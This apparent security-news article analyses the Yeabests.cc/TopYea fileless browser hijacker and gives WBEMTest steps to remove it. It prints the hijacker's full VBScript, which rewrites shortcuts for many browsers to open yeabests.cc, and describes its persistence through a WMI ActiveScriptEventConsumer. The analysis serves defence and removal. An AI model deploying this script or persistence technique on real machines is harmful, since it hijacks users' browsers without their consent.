@@ -1,0 +1,255 @@
+
+	   
+Windows comes with a tool called the Windows Management Instrumentation, or WMI, that can be used by system administrators to receive information and notifications from Windows. Using WMI, an administrator can pretty much query any Windows information including what programs are installed, storage use on a hard drive, or monitor a folder for changes. The WMI can also be used to launch VBScript or PowerShell scripts when a particular event occurs, such as when a file is created or some other system event has occurred. Unfortunately, this last feature can also be used by malware developers for more nefarious reasons such as creating fileless infectors.
+
+Yeabests.cc utilizes the WMI to hijack your browser shortcuts
+
+Today, Djordje Lukic, a malware analyst for Zemana, reached out to me to let me know about a new fileless browser hijacker called Yeabests.cc and provided me a sample of the installer. This hijacker infects a victim's browser shortcuts by adding http://yeabests.cc as an argument to the executable.This would cause the yeabests.cc, or TopYea, site to open automatically when the browser starts. 
+
+
+Hijacked Internet Explorer shortcut
+
+ As you can see from the shortcut,  Internet Explorer is executed with the argument of yeabests.cc, which would cause that homepage to automatically display when Internet Explorer starts.
+
+The malware works by registering itself as an instance of the ActiveScriptEventConsumer class in the ROOT\subscription namespace.  This instance will be named ASEC and contain a VBScript script that will execute every 10 seconds. When executed, it will infect your browser's shortcuts so that they open Yeabests.cc when started. You can see this configured instance in the screenshot of WMI Explorer below.
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}
+WMI Explorer showing the Malware VBScript
+
+The VBScript that will be executed is:
+
+Dim objFS
+Set objFS = CreateObject("Scripting.FileSystemObject")
+On Error Resume Next
+Const link = "http://yeabests.cc"
+browsers = Array("IEXPLORE.EXE", "chrome.exe", "firefox.exe", "360chrome.exe", "360SE.exe", "SogouExplorer.exe", "opera.exe", "Safari.exe", "Maxthon.exe", "TTraveler.exe", "TheWorld.exe", "baidubrowser.exe", "liebao.exe", "QQBrowser.exe")
+Set BrowserDic = CreateObject("scripting.dictionary")
+For Each browser In browsers
+	BrowserDic.Add LCase(browser), browser
+Next
+Dim FoldersDic(12)
+Set WshShell = CreateObject("Wscript.Shell")
+FoldersDic(0) = "C:\Users\Public\Desktop"
+FoldersDic(1) = "C:\ProgramData\Microsoft\Windows\Start Menu"
+FoldersDic(2) = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
+FoldersDic(3) = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+FoldersDic(4) = "C:\Users\User\Desktop"
+FoldersDic(5) = "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu"
+FoldersDic(6) = "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
+FoldersDic(7) = "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+FoldersDic(8) = "C:\Users\User\AppData\Roaming\Roaming"
+FoldersDic(9) = "C:\Users\User\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch"
+FoldersDic(10) = "C:\Users\User\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu"
+FoldersDic(11) = "C:\Users\User\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
+Set fso = CreateObject("Scripting.Filesystemobject")
+For i = 0 To UBound(FoldersDic)
+	For Each file In fso.GetFolder(FoldersDic(i)).Files
+		If LCase(fso.GetExtensionName(file.Path)) = "lnk" Then
+			set oShellLink = WshShell.CreateShortcut(file.Path)
+			path = oShellLink.TargetPath
+			name = fso.GetBaseName(path) & "." & fso.GetExtensionName(path)
+			If BrowserDic.Exists(LCase(name)) Then
+				oShellLink.Arguments = link
+				If file.Attributes And 1 Then
+					file.Attributes = file.Attributes - 1
+				End If
+				oShellLink.Save
+			End If
+		End If
+	Next
+Next
+createobject("wscript.shell").run "cmd /c taskkill /f /im scrcons.exe", 0
+
+
+When executed, the script will target and infect the shortcuts for the following web browsers:
+
+Targeted Web Browsers
+	Internet Explorer
+			Chrome
+			Firefox
+		360 Chrome
+			Sogou Explorer
+			Opera
+		Safari
+			Maxthon
+			QQ Browser
+		Baidu Browser
+			TheWorld Browser
+			Liebao
+		Tencent Traveler
+			 
+			 
+		Since this infection's installer deletes itself when run, does not create any files on the hard drive, and only resides in the WMI, most anti-malware and antivirus vendors would not be able to detect it. In order to target this infection, Zemana has introduced this technology into their scanner so that it can view and remove these types of malicious WMI instances.  
+
+For those who are infected with the Yeahbests.cc or TopYeah browser hijacker, we have a guide that can automate the removal process here: How to remove the Yeabests.cc and TopYea Browser Hijacker. For those who wish to learn how to remove it manually, you can read the next section.
+
+How to manually remove the Yeabeasts.cc infection script from WMI
+
+If you wish to remove the Yeabeasts.cc and TopYea infection, the easiest method is to use a program like Zemana.  If you wish to remove this infection manually, though, you will need to use WBEMTest to delete the registered instance.
+
+When starting WBEMTest we need to run it with administrator privileges. To do this, right click on the C:\Windows\System32\wbemtest.exe executable and then select Run as Administrator.  WBEMTest will now start and you will see its main screen as shown below.
+
+
+WBEMTest
+
+Now click on the Connect and in the Namespace field enter root\subscription as shown in the image below.
+
+
+Connect to Namespace
+
+Now click on the Connect button. You will now be at the main WBEMTest options screen for the root\subscription namespace as shown below.
+
+
+Subscription Namespace
+
+Now put a checkmark in the Enable All Privileges checkbox and click on the Enum Instances button. This will open up a dialog box where it asks you to type in the name of the instance you wish to connect to.
+
+
+Class Info Dialog Box
+
+In the above field, enter ActiveScriptEventConsumer and then press the OK button. You will now be at a page that lists all instances found for that superclass.  
+
+
+Query Result
+
+Look through the list of instances, and if you see one called ASEC, left-click on it once to select it.  Then click on the Delete button.
+
+The malicious event handler will now be removed from the WMI and you can use a tool like Shortcut Cleaner to clean your shortcuts of the Yeabests.cc and TopYea infection.
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+    
+        
+            
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+           
+          
+            Related Articles:
+	     Android malware Konfety uses malformed APKs to evade detection
+	  
+ 
+	  
